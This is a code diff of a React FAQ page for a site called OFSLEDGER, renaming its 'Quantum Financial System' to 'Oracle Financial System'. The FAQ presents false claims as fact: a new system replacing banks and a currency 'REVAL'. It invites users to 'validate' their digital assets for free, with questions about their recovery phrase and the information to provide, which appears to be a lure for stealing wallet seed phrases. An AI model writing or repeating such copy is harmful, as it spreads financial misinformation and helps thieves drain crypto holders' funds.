@@ -1,4 +1,3 @@
-
 import React from "react";
 import {
   Accordion,
@@ -14,19 +13,19 @@ const FAQ = () => {
   const faqs = [
     {
       question: "What is OFSLEDGER?",
-      answer: "OFSLEDGER is a platform designed to facilitate the transition to the Quantum Financial System (QFS). It provides secure validation for digital assets and ensures they are properly integrated into the new financial paradigm."
+      answer: "OFSLEDGER is a platform designed to facilitate the transition to the Oracle Financial System (OFS). It provides secure validation for digital assets and ensures they are properly integrated into the new financial paradigm."
     },
     {
-      question: "What is the Quantum Financial System (QFS)?",
-      answer: "The Quantum Financial System is a new financial infrastructure designed to replace the current banking system. It aims to put an end to corruption, usury, and manipulation within banking by providing 100% financial security and transparency for all currency holders globally."
+      question: "What is the Oracle Financial System (OFS)?",
+      answer: "The Oracle Financial System is a new financial infrastructure designed to replace the current banking system. It aims to put an end to corruption, usury, and manipulation within banking by providing 100% financial security and transparency for all currency holders globally."
     },
     {
-      question: "Is QFS a cryptocurrency?",
-      answer: "No, QFS is NOT cryptocurrency. After reevaluation (REVAL), all sovereign currencies will be asset-backed, ensuring stable value which makes the need for unbacked cryptocurrencies obsolete. The process simply digests the information on computer memory banks."
+      question: "Is OFS a cryptocurrency?",
+      answer: "No, OFS is NOT cryptocurrency. After reevaluation (REVAL), all sovereign currencies will be asset-backed, ensuring stable value which makes the need for unbacked cryptocurrencies obsolete. The process simply digests the information on computer memory banks."
     },
     {
       question: "Why do I need to validate my digital assets?",
-      answer: "Asset validation is necessary to ensure your digital assets are properly recognized and secured within the new Quantum Financial System. This process helps prevent fraud and ensures proper ownership tracking."
+      answer: "Asset validation is necessary to ensure your digital assets are properly recognized and secured within the new Oracle Financial System. This process helps prevent fraud and ensures proper ownership tracking."
     },
     {
       question: "How does OFSLEDGER ensure the security of my recovery phrase?",
@@ -54,7 +53,7 @@ const FAQ = () => {
     },
     {
       question: "Is there a fee for using OFSLEDGER?",
-      answer: "OFSLEDGER currently provides its validation services free of charge as we contribute to the global transition to the Quantum Financial System."
+      answer: "OFSLEDGER currently provides its validation services free of charge as we contribute to the global transition to the Oracle Financial System."
     },
     {
       question: "What information do I need to provide for validation?",
@@ -71,7 +70,7 @@ const FAQ = () => {
             <div className="text-center mb-16">
               <h1 className="text-4xl md:text-5xl font-bold mb-6">Frequently Asked Questions</h1>
               <p className="text-lg text-gray-600">
-                Find answers to common questions about OFSLEDGER and the Quantum Financial System
+                Find answers to common questions about OFSLEDGER and the Oracle Financial System
               </p>
             </div>
           </AnimatedSection>
